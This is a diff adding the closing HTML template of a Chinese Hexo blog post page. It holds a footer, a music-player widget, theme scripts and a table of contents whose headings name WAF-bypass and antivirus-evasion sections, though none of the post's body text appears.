+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">Ehiyor</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+
+    
+
+<!-- 引入 APlayer 和 MetingJS -->
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2.0.1/dist/Meting.min.js"></script> -->
+
+<!-- 固定音乐播放器 -->
+<!-- <meting-js
+    server="netease"
+    type="playlist"
+    id="7828112982"
+    fixed="true"
+    autoplay="false"
+    order="random"
+    theme="#42b983">
+</meting-js> -->
+
+<meting-js
+    server="netease"
+    type="playlist"
+    id="7828112982"
+    fixed="true"
+    autoplay="false"
+    order="random"
+    theme="#42b983">
+</meting-js>
+
+
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools left-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#waf-%E9%98%B2%E6%8A%A4%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3"><span class="nav-text"> WAF 防护原理讲解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E7%BB%95%E8%BF%87waf"><span class="nav-text"> 目录扫描绕过waf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A6%81%E7%94%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="nav-text"> 禁用命令执行函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BF%E9%97%AE%E5%8F%97%E9%99%90%E7%BB%95%E8%BF%87"><span class="nav-text"> 访问受限绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87-waf"><span class="nav-text"> 手工注入绕过 waf</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87d%E7%9B%BE%E5%AE%89%E5%85%A8%E7%8B%97%E7%9A%84%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="nav-text"> 过D盾+安全狗的注入语句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8F%9C%E5%88%80%E6%8B%A6%E6%88%AA"><span class="nav-text"> 菜刀拦截</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B9%E5%8C%85%E8%BF%87-waf"><span class="nav-text"> 改包过 waf</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E6%9D%80"><span class="nav-text"> 免杀</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#shellter%E5%85%8D%E6%9D%80"><span class="nav-text"> shellter免杀</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%8D%E6%9D%80-msfpayload"><span class="nav-text"> 免杀 msfpayload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#venom-%E5%85%8D%E6%9D%80-payload"><span class="nav-text"> venom 免杀 payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shecodject-%E5%85%8D%E6%9D%80"><span class="nav-text"> shecodject 免杀</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E5%8F%96%E8%BF%87waf"><span class="nav-text"> 提取过waf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A1%A5%E5%85%85"><span class="nav-text"> 补充</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+<script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/utils.js"></script><script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/header-shrink.js"></script><script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/back2top.js"></script><script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/toggle-theme.js"></script><script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/code-block.js"></script><script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/main.js"></script><script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/libs/anime.min.js"></script>
+
+<!-- local search -->
+
+    <script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/local-search.js"></script>
+
+
+<!-- lazyload -->
+
+    <script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/lazyload.js"></script>
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        <script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/post/post-helper.js"></script>
+
+        <!-- toc -->
+        
+            <script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/post/toc.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+            <script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/post/share.js"></script>
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    <script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+    
+        
+    
+
+</body>
+
+</html>
